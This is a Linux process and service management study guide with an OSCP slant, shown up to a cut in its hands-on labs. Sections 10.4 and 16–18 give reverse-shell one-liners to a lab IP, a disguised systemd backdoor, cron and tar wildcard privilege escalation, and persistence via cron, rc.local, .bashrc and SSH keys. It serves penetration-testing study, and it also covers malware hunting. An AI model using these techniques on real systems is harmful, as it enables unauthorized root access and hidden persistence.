# Process Management & Services - COMPREHENSIVE GUIDE

---
title: "Process Management & Services"
parent: "[[03_Linux]]"
tags:
  - linux
  - systemd
  - processes
  - cron
  - persistence
  - malware-hunting
  - services
  - init
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Every action on a Linux system happens through processes - from the login shell to web servers, databases, and even malware. Understanding process management is CRITICAL for OSCP and penetration testing because processes are how you maintain persistence, escalate privileges, hunt malware, and understand system behavior. A process is simply a running instance of a program, but the way Linux manages, schedules, and controls processes is complex and powerful. You need to know how to start/stop services, schedule tasks with cron, analyze running processes, send signals, debug issues, and most importantly - exploit misconfigured services and scheduled tasks for privilege escalation. This comprehensive guide covers everything from absolute basics (what is a process?) to advanced OSCP techniques (cron job exploitation, systemd service creation for persistence, process injection). You'll learn the process lifecycle, systemd vs init systems, service management, job control, signals, cron scheduling, process monitoring tools, and exploitation techniques. With 20+ working examples, hands-on labs, and real OSCP scenarios, you'll master process management from beginner to expert.

---

## Table of Contents

1. [Understanding Processes (Absolute Beginner)](#1-understanding-processes-absolute-beginner)
2. [Process Lifecycle: Fork, Exec, and Wait](#2-process-lifecycle-fork-exec-and-wait)
3. [Process Identification: PID, PPID, and UID](#3-process-identification-pid-ppid-and-uid)
4. [Viewing Processes: ps, top, htop](#4-viewing-processes-ps-top-htop)
5. [Process States and Priorities](#5-process-states-and-priorities)
6. [Signals: Controlling Processes](#6-signals-controlling-processes)
7. [Job Control: Background and Foreground](#7-job-control-background-and-foreground)
8. [The Init System: systemd vs SysVinit](#8-the-init-system-systemd-vs-sysvinit)
9. [systemd Service Management](#9-systemd-service-management)
10. [Creating systemd Services](#10-creating-systemd-services)
11. [systemd Timers](#11-systemd-timers)
12. [Cron: Traditional Scheduling](#12-cron-traditional-scheduling)
13. [at and batch Commands](#13-at-and-batch-commands)
14. [Process Monitoring and Troubleshooting](#14-process-monitoring-and-troubleshooting)
15. [lsof: List Open Files](#15-lsof-list-open-files)
16. [Process Persistence Techniques](#16-process-persistence-techniques)
17. [Cron Job Privilege Escalation](#17-cron-job-privilege-escalation)
18. [Service Exploitation](#18-service-exploitation)
19. [Malware Hunting and Detection](#19-malware-hunting-and-detection)
20. [Hands-On Labs](#20-hands-on-labs)
21. [Interview Questions and Answers](#21-interview-questions-and-answers)
22. [Summary and Next Steps](#22-summary-and-next-steps)

---

## 1. Understanding Processes (Absolute Beginner)

### 1.1 What Is a Process?

A **process** is a running instance of a program.

**Real-world analogy**:
- **Program**: A recipe in a cookbook (stored on disk)
- **Process**: Actually cooking the recipe (running in memory)
- You can cook the same recipe multiple times = multiple processes from one program

**Examples**:
```bash
# One program (Firefox), three processes (three windows)
firefox &
firefox &
firefox &

# Each has a unique Process ID (PID)
```

### 1.2 Program vs Process

```
┌─────────────────────────────────────────┐
│      PROGRAM vs PROCESS                 │
├─────────────────────────────────────────┤
│  PROGRAM                                │
│  - Executable file on disk              │
│  - Example: /bin/bash                   │
│  - Static, passive                      │
│                                         │
│  PROCESS                                │
│  - Running instance in memory           │
│  - Has PID, memory, CPU time            │
│  - Dynamic, active                      │
│  - Can have multiple instances          │
│                                         │
│  ANALOGY:                               │
│  Program = Sheet music                  │
│  Process = Orchestra playing it         │
└─────────────────────────────────────────┘
```

### 1.3 Process Components

Every process has:
1. **PID (Process ID)**: Unique identifier
2. **Memory space**: RAM allocated to it
3. **CPU time**: Time spent executing
4. **User/Group**: Who owns it (UID/GID)
5. **Priority**: Scheduling priority
6. **State**: Running, sleeping, stopped, zombie
7. **Parent process (PPID)**: Who created it
8. **Open files**: What files it's accessing

### 1.4 Types of Processes

**Foreground processes**:
- Attached to terminal
- You see output directly
- Example: When you run `ls`, you wait for it to finish

**Background processes**:
- Run independently of terminal
- Started with `&` or `Ctrl+Z` + `bg`
- Example: `firefox &`

**Daemons**:
- Background services that run continuously
- No terminal attached
- Examples: `sshd`, `httpd`, `mysqld`
- Usually end with 'd' (daemon)

---

## 2. Process Lifecycle: Fork, Exec, and Wait

### 2.1 The Process Tree

All processes descend from **PID 1** (init/systemd).

```
┌────────────────────────────────────────┐
│         PROCESS TREE                   │
├────────────────────────────────────────┤
│  PID 1: systemd (or init)              │
│      ├─ sshd                           │
│      │   └─ sshd (session)             │
│      │       └─ bash                   │
│      │           ├─ ls                 │
│      │           └─ vim                │
│      ├─ apache2                        │
│      │   ├─ apache2 (worker)           │
│      │   ├─ apache2 (worker)           │
│      │   └─ apache2 (worker)           │
│      └─ mysqld                         │
└────────────────────────────────────────┘
```

View process tree:
```bash
pstree

# With PIDs
pstree -p

# For specific process
pstree -p 1234
```

### 2.2 Fork System Call

**Fork** creates an exact copy of the current process.

```
BEFORE fork():
Parent Process (PID 100)

AFTER fork():
Parent Process (PID 100)
    └─ Child Process (PID 101) - identical copy
```

**What gets copied**:
- Memory contents
- Open files
- Environment variables
- Current working directory

**What's different**:
- PID (child gets new PID)
- PPID (child's parent is the original process)
- fork() return value (0 in child, child's PID in parent)

### 2.3 Exec System Call

**Exec** replaces the current process with a new program.

```
BEFORE exec("/bin/ls"):
Process (PID 101): Running /bin/bash

AFTER exec("/bin/ls"):
Process (PID 101): Running /bin/ls
(Same PID, different program)
```

### 2.4 The Shell Process Creation

When you type a command in bash:

```
1. You type: ls -la
2. Bash calls fork()
   - Parent: bash (waits)
   - Child: bash clone
3. Child calls exec("/bin/ls", "-la")
   - Child becomes ls process
4. ls runs, prints output, exits
5. Parent bash resumes, shows prompt
```

**Code example** (simplified C):
```c
pid_t pid = fork();
if (pid == 0) {
    // Child process
    exec("/bin/ls", "-la", NULL);
} else {
    // Parent process
    wait(&status);  // Wait for child to finish
}
```

### 2.5 Process Termination

Processes end by:
1. **Exit normally**: Program finishes, calls `exit()`
2. **Exit with error**: Program encounters fatal error
3. **Killed by signal**: Receives SIGKILL, SIGTERM, etc.
4. **Parent dies**: Sometimes child processes die too (depends on setup)

**Exit codes**:
- `0` = Success
- `1-255` = Error (different meanings per program)

```bash
# Check last command exit code
echo $?

# Example
ls /nonexistent
echo $?  # Prints non-zero (error)

ls /home
echo $?  # Prints 0 (success)
```

---

## 3. Process Identification: PID, PPID, and UID

### 3.1 Process ID (PID)

**PID**: Unique number identifying each process.

```bash
# See your current shell's PID
echo $$

# See PIDs of all processes
ps aux

# Find PID of specific program
pidof sshd
pgrep firefox

# Find PID by name pattern
pgrep -f "python.*server"
```

**Special PIDs**:
- **PID 0**: Kernel scheduler (not visible)
- **PID 1**: Init process (systemd or init)
- **PID 2**: kthreadd (kernel thread daemon)

### 3.2 Parent Process ID (PPID)

**PPID**: PID of the process that created this process.

```bash
# View PPID
ps -ef  # Shows PID and PPID columns

# Example output:
# UID   PID  PPID  COMMAND
# root    1     0  /sbin/init
# root  100     1  sshd
# john  200   100  bash
# john  300   200  vim
```

**Orphan processes**: If parent dies, process gets adopted by PID 1.

### 3.3 User and Group IDs

Every process runs as a specific user/group.

```bash
# View process user
ps aux
# Shows: USER, PID, %CPU, %MEM, COMMAND

# View detailed user info
ps -eo pid,user,group,cmd

# Find processes by user
ps -u john
pgrep -u root
```

---

## 4. Viewing Processes: ps, top, htop

### 4.1 ps - Process Status

**Basic usage**:
```bash
# Show your processes
ps

# Show all processes (BSD style)
ps aux

# Show all processes (Unix style)
ps -ef

# Detailed format
ps -eo pid,ppid,user,cmd
```

**Common options**:
```bash
# All processes, full format
ps auxf

# Process tree
ps auxf --forest

# Specific user
ps -u apache

# Specific process
ps -p 1234

# Threads
ps -eLf

# Sort by CPU usage
ps aux --sort=-%cpu | head

# Sort by memory usage
ps aux --sort=-%mem | head
```

**Understanding ps aux output**:
```
USER  PID  %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root    1   0.0  0.1 225916  9204 ?    Ss   Jan01   0:05 /sbin/init
john  123   5.2  2.1 234567 12345 pts/0 Sl  10:30   1:23 firefox
```

- **USER**: Owner of process
- **PID**: Process ID
- **%CPU**: CPU usage percentage
- **%MEM**: Memory usage percentage
- **VSZ**: Virtual memory size (KB)
- **RSS**: Resident set size (physical RAM in KB)
- **TTY**: Terminal (? = no terminal)
- **STAT**: Process state (see next section)
- **START**: When process started
- **TIME**: Total CPU time
- **COMMAND**: Command that started process

### 4.2 top - Real-time Process Monitor

```bash
# Launch top
top

# Interactive commands while running:
# h - help
# q - quit
# k - kill process
# r - renice (change priority)
# u - filter by user
# M - sort by memory
# P - sort by CPU
# 1 - show individual CPUs
# c - show full command path
```

**Top output sections**:
```
top - 10:30:42 up 5 days,  2:15,  3 users,  load average: 0.15, 0.20, 0.18
Tasks: 156 total,   1 running, 155 sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.3 us,  1.0 sy,  0.0 ni, 96.5 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   7953.4 total,   2345.6 free,   3456.7 used,   2151.1 buff/cache
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   4234.5 avail Mem
```

**Load average**: System load over 1, 5, and 15 minutes
- On single-core system: 1.0 = 100% busy
- On quad-core: 4.0 = 100% busy

### 4.3 htop - Enhanced top

```bash
# Install
sudo apt install htop

# Launch
htop

# Advantages over top:
# - Color-coded
# - Mouse support
# - Easier to kill/renice processes
# - Tree view
# - Better visual indicators
```

**htop features**:
- F1: Help
- F2: Setup
- F3: Search
- F4: Filter
- F5: Tree view
- F6: Sort by column
- F9: Kill process
- F10: Quit

### 4.4 Other Process Viewing Tools

```bash
# Simple process list
pgrep process_name
pgrep -l firefox  # With name

# Full command line
pgrep -a firefox

# Count processes
pgrep -c httpd

# Process IDs only
pidof firefox

# Show process details
cat /proc/PID/status
cat /proc/PID/cmdline
cat /proc/PID/environ
```

---

## 5. Process States and Priorities

### 5.1 Process States

**STAT column in ps**:

| Code | State | Description |
|:-----|:------|:------------|
| R | Running | Executing or ready to run |
| S | Sleeping | Waiting for event (interruptible) |
| D | Disk sleep | Waiting for I/O (uninterruptible) |
| T | Stopped | Suspended (Ctrl+Z) |
| Z | Zombie | Terminated, waiting for parent to read exit status |
| < | High priority | Nice value < 0 |
| N | Low priority | Nice value > 0 |
| L | Locked | Has pages locked in memory |
| s | Session leader | Parent of process group |
| l | Multi-threaded | Has multiple threads |
| + | Foreground | In foreground process group |

**Examples**:
```
Ss   - Sleeping session leader
R+   - Running in foreground
Sl   - Sleeping with threads
D    - Uninterruptible sleep (unkillable!)
Z    - Zombie (already dead)
```

### 5.2 Zombie Processes

**Zombie (defunct)**: Process has finished but parent hasn't collected exit status.

```bash
# Find zombies
ps aux | grep Z

# Example:
# john  1234  0.0  0.0      0     0 ?    Z    10:30   0:00 [defunct]

# Cannot kill zombie (already dead!)
# Must kill parent process or wait for parent to clean up
```

**How to fix**:
```bash
# Find parent PID
ps -o ppid= -p 1234

# Kill parent (if safe to do so)
kill PPID
```

### 5.3 Process Priority and Nice Values

**Nice value**: Process priority (-20 to +19)
- **-20**: Highest priority (most CPU time)
- **0**: Default priority
- **+19**: Lowest priority (least CPU time)

**View priority**:
```bash
ps -eo pid,ni,cmd

# NI column shows nice value
```

**Change priority**:
```bash
# Start with specific nice value
nice -n 10 command

# Very low priority (background task)
nice -n 19 tar czf backup.tar.gz /data

# Change running process (requires root for negative values)
renice -n -5 -p 1234

# Change all processes of user
renice -n 5 -u john
```

---

## 6. Signals: Controlling Processes

### 6.1 What Are Signals?

**Signals** are software interrupts sent to processes to indicate events.

```
┌────────────────────────────────────────┐
│         SIGNAL FLOW                    │
├────────────────────────────────────────┤
│  User/System                           │
│      │                                 │
│      ▼                                 │
│  Send Signal (kill -9 1234)            │
│      │                                 │
│      ▼                                 │
│  Kernel delivers signal                │
│      │                                 │
│      ▼                                 │
│  Process receives signal               │
│      │                                 │
│      ▼                                 │
│  Process action:                       │
│  - Ignore (some signals)               │
│  - Catch (run handler)                 │
│  - Default action (usually terminate)  │
└────────────────────────────────────────┘
```

### 6.2 Common Signals

| Signal | Number | Default Action | Description |
|:-------|:-------|:---------------|:------------|
| SIGHUP | 1 | Terminate | Hangup (reload config) |
| SIGINT | 2 | Terminate | Interrupt (Ctrl+C) |
| SIGQUIT | 3 | Core dump | Quit (Ctrl+\) |
| SIGKILL | 9 | Terminate | **Cannot be caught/ignored** |
| SIGSEGV | 11 | Core dump | Segmentation fault |
| SIGTERM | 15 | Terminate | Polite termination (default) |
| SIGSTOP | 19 | Stop | **Cannot be caught/ignored** |
| SIGCONT | 18 | Continue | Resume after stop |
| SIGCHLD | 17 | Ignore | Child process terminated |

### 6.3 Sending Signals

```bash
# Send signal to process
kill -SIGNAL PID

# Common examples:
kill 1234           # SIGTERM (15) - polite stop
kill -9 1234        # SIGKILL - forceful kill
kill -15 1234       # SIGTERM (explicit)
kill -KILL 1234     # SIGKILL (by name)
kill -HUP 1234      # SIGHUP - reload config
kill -STOP 1234     # SIGSTOP - pause
kill -CONT 1234     # SIGCONT - resume

# Kill all processes by name
killall firefox
killall -9 firefox

# Kill by pattern
pkill firefox
pkill -9 -f "python.*server"

# Kill all user processes
killall -u john
pkill -9 -u john
```

### 6.4 Signal Handling in Scripts

```bash
#!/bin/bash
# trap_example.sh

cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/lockfile
    exit 0
}

# Trap SIGINT (Ctrl+C) and SIGTERM
trap cleanup INT TERM

echo "Script running... (Press Ctrl+C to stop)"
touch /tmp/lockfile

while true; do
    echo "Working..."
    sleep 2
done
```

### 6.5 The Difference Between kill -9 and kill -15

**SIGTERM (15) - Polite**:
```bash
kill 1234  # or kill -15 1234

# Process receives signal
# Process can:
# - Save data
# - Close files
# - Clean up resources
# - Exit gracefully
```

**SIGKILL (9) - Forceful**:
```bash
kill -9 1234

# Process CANNOT catch this signal
# Kernel immediately terminates it
# No cleanup, no saving
# Use as last resort
```

**Best practice**:
```bash
# Try polite termination first
kill 1234
sleep 2

# Check if still running
ps -p 1234 || echo "Process terminated"

# If still alive, force kill
ps -p 1234 && kill -9 1234
```

---

## 7. Job Control: Background and Foreground

### 7.1 Running Jobs in Background

```bash
# Start process in background
command &

# Example
sleep 100 &
firefox &

# Multiple commands
(command1; command2; command3) &
```

### 7.2 Suspending and Resuming Jobs

```bash
# Suspend current foreground job
# Press: Ctrl+Z

# Example:
$ vim file.txt
# Press Ctrl+Z
[1]+  Stopped    vim file.txt

# Resume in foreground
fg

# Resume in background
bg

# Resume specific job
fg %1
bg %2
```

### 7.3 Managing Jobs

```bash
# List jobs
jobs

# Example output:
# [1]   Running    sleep 100 &
# [2]-  Stopped    vim file.txt
# [3]+  Running    firefox &

# Bring job to foreground
fg %1    # By job number
fg %vim  # By command name

# Send job to background
bg %2

# Kill job
kill %1

# Disown job (detach from terminal)
disown %1
```

### 7.4 nohup - Run Command Immune to Hangups

```bash
# Command continues even after logout
nohup command &

# Output goes to nohup.out
nohup long_process.sh &

# Redirect output
nohup command > output.log 2>&1 &

# Check nohup processes
ps aux | grep nohup
```

### 7.5 screen and tmux - Terminal Multiplexers

**screen**:
```bash
# Start screen session
screen

# Detach: Ctrl+a, d
# Reattach:
screen -r

# List sessions:
screen -ls

# Named session:
screen -S mysession
screen -r mysession
```

**tmux** (modern alternative):
```bash
# Start tmux
tmux

# Detach: Ctrl+b, d
# Reattach:
tmux attach

# List sessions:
tmux ls

# Named session:
tmux new -s mysession
tmux attach -t mysession
```

---

## 8. The Init System: systemd vs SysVinit

### 8.1 What Is Init?

**Init** (PID 1): The first process started by the kernel. It:
- Starts all system services
- Manages system state (boot, shutdown, reboot)
- Adopts orphaned processes

**If PID 1 dies → system panic (kernel crash)**

### 8.2 SysVinit (Legacy)

**Characteristics**:
- Uses shell scripts in `/etc/init.d/`
- Sequential startup (slow)
- Runlevels (0-6)
- Simple but limited

```bash
# Start service
/etc/init.d/apache2 start
service apache2 start

# Runlevels:
# 0 - Halt
# 1 - Single user mode
# 2-5 - Multi-user modes
# 6 - Reboot
```

### 8.3 systemd (Modern)

**Characteristics**:
- Binary configuration (unit files)
- Parallel startup (fast)
- Targets instead of runlevels
- Comprehensive logging (journald)
- Socket activation
- Dependency management

**Most modern distros use systemd** (Ubuntu, Debian, Fedora, Arch, etc.)

### 8.4 Checking Your Init System

```bash
# Check if systemd
ps -p 1

# Should show: /lib/systemd/systemd

# Or
stat /proc/1/exe

# systemd version
systemd --version
```

---

## 9. systemd Service Management

### 9.1 systemd Unit Types

| Unit Type | Extension | Purpose |
|:----------|:----------|:--------|
| Service | .service | Daemons/services |
| Socket | .socket | IPC sockets |
| Target | .target | Group of units (like runlevels) |
| Timer | .timer | Scheduled tasks |
| Mount | .mount | Filesystem mounts |
| Device | .device | Device management |

**Most common**: `.service` files

### 9.2 systemctl Commands

```bash
# Start service
sudo systemctl start apache2

# Stop service
sudo systemctl stop apache2

# Restart service
sudo systemctl restart apache2

# Reload configuration (without restarting)
sudo systemctl reload apache2

# Enable at boot
sudo systemctl enable apache2

# Disable at boot
sudo systemctl disable apache2

# Check status
systemctl status apache2

# Check if enabled
systemctl is-enabled apache2

# Check if active
systemctl is-active apache2
```

### 9.3 Listing Units

```bash
# List all active services
systemctl list-units --type=service

# List all services (including inactive)
systemctl list-units --type=service --all

# List failed services
systemctl --failed

# List enabled services
systemctl list-unit-files --state=enabled

# List running timers
systemctl list-timers
```

### 9.4 Service Dependency Management

```bash
# Show dependencies
systemctl list-dependencies apache2

# Show reverse dependencies (what depends on this)
systemctl list-dependencies --reverse apache2

# Analyze boot time
systemd-analyze

# Blame (which services took longest)
systemd-analyze blame

# Critical chain
systemd-analyze critical-chain
```

### 9.5 Masking Services

**Masking** prevents service from being started (even manually).

```bash
# Mask service (symlink to /dev/null)
sudo systemctl mask apache2

# Cannot start even with systemctl start
sudo systemctl start apache2
# Failed: Unit apache2.service is masked

# Unmask
sudo systemctl unmask apache2
```

---

## 10. Creating systemd Services

### 10.1 Service Unit File Structure

```ini
[Unit]
Description=My Custom Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/path/to/executable
ExecStop=/path/to/stop-script
Restart=on-failure
RestartSec=5s
User=myuser
Group=mygroup
Environment="VAR=value"

[Install]
WantedBy=multi-user.target
```

### 10.2 Service Types

| Type | Description |
|:-----|:------------|
| simple | Main process (default) |
| forking | Process forks, parent exits |
| oneshot | Process exits after completion |
| notify | Process sends notification when ready |
| idle | Delays until other jobs finish |

### 10.3 Example: Simple Web Server Service

```bash
# Create service file
sudo nano /etc/systemd/system/mywebserver.service
```

```ini
[Unit]
Description=My Python Web Server
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -m http.server 8080
WorkingDirectory=/var/www/html
Restart=always
RestartSec=10
User=www-data
Group=www-data

[Install]
WantedBy=multi-user.target
```

**Activate**:
```bash
# Reload systemd
sudo systemctl daemon-reload

# Enable and start
sudo systemctl enable --now mywebserver

# Check status
systemctl status mywebserver
```

### 10.4 Example: Reverse Shell Service (OSCP Persistence)

```bash
sudo nano /etc/systemd/system/backdoor.service
```

```ini
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now backdoor
```

**Result**: Persistent reverse shell that:
- Starts on boot
- Restarts if killed
- Reconnects every 60 seconds if connection drops

---

## 11. systemd Timers

### 11.1 What Are Timers?

**systemd timers** replace cron jobs with better:
- Logging (journald integration)
- Dependency management
- Precision timing
- Error handling

### 11.2 Creating a Timer

**Requires TWO files**:
1. `.service` file (what to run)
2. `.timer` file (when to run it)

**Example: Daily backup**

**backup.service**:
```ini
[Unit]
Description=Daily Backup

[Service]
Type=oneshot
ExecStart=/usr/local/bin/backup.sh
```

**backup.timer**:
```ini
[Unit]
Description=Daily Backup Timer

[Timer]
OnCalendar=daily
OnCalendar=*-*-* 02:00:00
Persistent=true

[Install]
WantedBy=timers.target
```

**Activate**:
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now backup.timer

# Check timer status
systemctl list-timers
systemctl status backup.timer
```

### 11.3 Timer Scheduling Options

```ini
# Run daily at 2 AM
OnCalendar=*-*-* 02:00:00

# Run every Monday at 3 AM
OnCalendar=Mon *-*-* 03:00:00

# Run hourly
OnCalendar=hourly

# Run every 15 minutes
OnCalendar=*:0/15

# Run 5 minutes after boot
OnBootSec=5min

# Run 10 minutes after service was last activated
OnUnitActiveSec=10min
```

---

## 12. Cron: Traditional Scheduling

### 12.1 Cron Basics

**Cron** schedules recurring tasks.

```
┌─────────── minute (0-59)
│ ┌───────── hour (0-23)
│ │ ┌─────── day of month (1-31)
│ │ │ ┌───── month (1-12)
│ │ │ │ ┌─── day of week (0-6, Sunday=0)
│ │ │ │ │
* * * * * command
```

### 12.2 Crontab Management

```bash
# Edit your crontab
crontab -e

# List your crontab
crontab -l

# Remove your crontab
crontab -r

# Edit other user's crontab (as root)
sudo crontab -e -u username
```

### 12.3 Cron Examples

```bash
# Run every minute
* * * * * /path/to/command

# Run every hour at minute 0
0 * * * * /path/to/command

# Run daily at 2:30 AM
30 2 * * * /path/to/command

# Run every Monday at 3 AM
0 3 * * 1 /path/to/command

# Run first day of month at midnight
0 0 1 * * /path/to/command

# Run every 15 minutes
*/15 * * * * /path/to/command

# Run every 6 hours
0 */6 * * * /path/to/command

# Run at reboot
@reboot /path/to/command

# Special keywords:
@yearly   # 0 0 1 1 *
@monthly  # 0 0 1 * *
@weekly   # 0 0 * * 0
@daily    # 0 0 * * *
@hourly   # 0 * * * *
@reboot   # At startup
```

### 12.4 System Cron Directories

```bash
# Hourly tasks
/etc/cron.hourly/

# Daily tasks
/etc/cron.daily/

# Weekly tasks
/etc/cron.weekly/

# Monthly tasks
/etc/cron.monthly/

# System-wide crontab
/etc/crontab

# User crontabs
/var/spool/cron/crontabs/
```

### 12.5 Cron Environment

**Important**: Cron runs with minimal environment.

```bash
# Specify PATH
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Redirect output
* * * * * /path/to/command > /tmp/output.log 2>&1

# Email output (if MAILTO set)
MAILTO=admin@example.com
* * * * * /path/to/command
```

---

## 13. at and batch Commands

### 13.1 at - One-time Scheduled Tasks

```bash
# Schedule command at specific time
at 10:30 PM
at> /path/to/command
at> Ctrl+D

# Alternative syntax
echo "/path/to/command" | at 10:30 PM

# At specific date/time
at 2:30 PM tomorrow
at 3:00 AM 01/15/2026
at now + 2 hours
at now + 30 minutes
at midnight

# List scheduled jobs
atq

# Remove scheduled job
atrm 1
```

### 13.2 batch - Run When System Load Is Low

```bash
# Run when load average < 1.5 (default)
batch
batch> /path/to/heavy-task
batch> Ctrl+D

# Specify load threshold (in /etc/default/atd)
```

---

## 14. Process Monitoring and Troubleshooting

### 14.1 Finding Resource Hogs

```bash
# Top CPU consumers
ps aux --sort=-%cpu | head -10

# Top memory consumers
ps aux --sort=-%mem | head -10

# Processes using most time
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head

# Count processes per user
ps aux | awk '{print $1}' | sort | uniq -c
```

### 14.2 Monitoring Specific Process

```bash
# Watch process
watch -n 1 'ps aux | grep process_name'

# Process tree
ps auxf | grep -A 5 process_name

# Detailed process info
cat /proc/PID/status
cat /proc/PID/limits
cat /proc/PID/cmdline

# Process working directory
ls -l /proc/PID/cwd

# Process executable
ls -l /proc/PID/exe
```

### 14.3 strace - System Call Tracer

```bash
# Trace system calls
strace command

# Trace running process
strace -p PID

# Count system calls
strace -c command

# Filter specific calls
strace -e open,read,write command

# Save to file
strace -o output.txt command

# Trace all child processes
strace -f command
```

**OSCP Use**: Debug why exploit isn't working.

---

## 15. lsof: List Open Files

### 15.1 What Is lsof?

**lsof** shows all open files and the processes using them.

**Remember**: "Everything is a file" - including network sockets, devices, pipes.

### 15.2 Common lsof Usage

```bash
# All open files
lsof

# Files opened by specific process
lsof -p 1234

# Files opened by command
lsof -c ssh

# Files opened by user
lsof -u john

# Specific file
lsof /var/log/syslog

# Directory
lsof +D /var/log

# Network connections
lsof -i

# Specific port
lsof -i :80
lsof -i :22

# TCP connections
lsof -i TCP

# UDP connections
lsof -i UDP

# IPv4 only
lsof -i 4

# Connections to specific host
lsof -i @192.168.1.100
```

### 15.3 Finding What's Using a Port

```bash
# What's listening on port 80?
lsof -i :80

# Example output:
# COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
# apache2  1234  root    4u  IPv4  12345      0t0  TCP *:80 (LISTEN)

# What's using port 4444 (reverse shell)?
lsof -i :4444
```

### 15.4 Finding Deleted Files Still Open

```bash
# Find deleted files still in use (recovery opportunity)
lsof | grep deleted

# Recover file
cp /proc/PID/fd/FD /tmp/recovered_file
```

---

## 16. Process Persistence Techniques

### 16.1 systemd Service Persistence

**Already covered in section 10.4**

Advantages:
- Survives reboot
- Auto-restarts if killed
- Looks legitimate
- Integrated with system

### 16.2 Cron Job Persistence

```bash
# Add to user crontab
crontab -e
@reboot /tmp/.hidden/backdoor

# Or run every 5 minutes
*/5 * * * * /tmp/.hidden/backdoor

# System-wide
echo "*/5 * * * * root /tmp/.hidden/backdoor" | sudo tee /etc/cron.d/update
```

### 16.3 rc.local Persistence

```bash
# Edit rc.local (runs at boot)
sudo nano /etc/rc.local

# Add before "exit 0":
/tmp/.hidden/backdoor &

# Make executable
sudo chmod +x /etc/rc.local
```

### 16.4 .bashrc Persistence

```bash
# Add to user's .bashrc (runs on login)
echo "/tmp/.hidden/backdoor &" >> ~/.bashrc

# Or system-wide
echo "/tmp/.hidden/backdoor &" | sudo tee -a /etc/bash.bashrc
```

### 16.5 SSH Authorized Keys

```bash
# Add SSH key for persistence
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

## 17. Cron Job Privilege Escalation

### 17.1 Finding Writable Cron Files

```bash
# Check cron directories
ls -la /etc/cron.*

# Find writable cron files
find /etc/cron* -type f -writable

# Check user crontabs
sudo ls -la /var/spool/cron/crontabs/

# Check /etc/crontab
cat /etc/crontab
```

### 17.2 Writable Cron Script Exploitation

**Scenario**: Found writable script in /etc/cron.hourly/

```bash
# Check permissions
ls -la /etc/cron.hourly/backup.sh
# -rwxrwxrwx 1 root root 100 Jan 24 backup.sh

# Inject malicious code
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /etc/cron.hourly/backup.sh

# Wait for cron to run (hourly)
# Setup listener
nc -lvnp 4444

# Get root shell!
```

### 17.3 Wildcard Injection in Cron

**Scenario**: Cron runs `tar` with wildcard.

```bash
# Cron job:
# */5 * * * * cd /var/backups && tar czf backup.tar.gz *

# Exploit
cd /var/backups
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" > shell.sh
chmod +x shell.sh

# Create malicious filenames
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# When tar runs:
# tar czf backup.tar.gz * 
# Expands to:
# tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# Executes shell.sh as root!
```

### 17.4 PATH Hijacking in Cron

```bash
# If cron script doesn't use absolute paths:
# */5 * * * * backup-script

# Check if /tmp is in PATH before /usr/bin
# Create malicious script
cat > /tmp/backup-script << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF
chmod +x /tmp/backup-script
```

---

## 18. Service Exploitation

### 18.1 Weak Service Permissions

```bash
# Find services with weak permissions
find /etc/systemd/system -type f -writable

# Modify service file
sudo nano /etc/systemd/system/vulnerable.service

# Add malicious ExecStart
ExecStart=/tmp/shell.sh

# Reload and restart
sudo systemctl daemon-reload
sudo systemctl restart vulnerable
```

### 18.2 Service Path Hijacking

**If service ExecStart uses relative path**:

```ini
[Service]
ExecStart=backup-script
```

Create malicious script earlier in PATH.

### 18.3 Exploiting Service Environment

Some services run with elevated privileges or sensitive environment variables.

```bash
# Check service environment
systemctl show service-name | grep Environment

# If LD_PRELOAD or LD_LIBRARY_PATH set, exploit with malicious library
```

---

## 19. Malware Hunting and Detection

### 19.1 Suspicious Process Indicators

**Red flags**:
- High CPU/memory usage from unknown process
- Process running from /tmp, /dev/shm, /var/tmp
- Process with weird name ([kworker], .hidden, etc.)
- Network connections to unknown IPs
- Process owner doesn't match expected (apache running as root)

### 19.2 Process Investigation

```bash
# 1. Identify suspicious process
top
ps aux | sort -rk 3,3 | head

# 2. Get details
ps -p PID -f
ls -l /proc/PID/exe
cat /proc/PID/cmdline
cat /proc/PID/environ

# 3. Check network connections
lsof -i -p PID
netstat -antp | grep PID

# 4. Check open files
lsof -p PID

# 5. Check parent process
ps -o ppid= -p PID

# 6. Check when started
ps -o lstart= -p PID
```

### 19.3 Hidden Process Detection

```bash
# Compare ps output with /proc
ls /proc | grep -E '^[0-9]+$' > /tmp/proc_pids
ps -e -o pid= > /tmp/ps_pids
diff /tmp/proc_pids /tmp/ps_pids

# Check for rootkit hooks
cat /proc/kallsyms | grep -i hack
```

### 19.4 Rogue Cron Jobs

```bash
# Check all user crontabs
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "Checking $user"
    sudo crontab -u $user -l 2>/dev/null
done

# Check system cron
cat /etc/crontab
ls -la /etc/cron.*
```

### 19.5 Rogue systemd Services

```bash
# Check for recently modified services
find /etc/systemd/system -type f -mtime -7

# Check for suspicious service names
systemctl list-units --type=service | grep -v -E '(ssh|cron|apache|mysql)'

# Check service file contents
systemctl cat service-name
```

---

## 20. Hands-On Labs

### Lab 1: Process Exploration

**Objective**: Understand process hierarchy.

```bash
# View process tree
pstree -p

# Find your shell's PID
echo $$

# Start background job
sleep 300 &

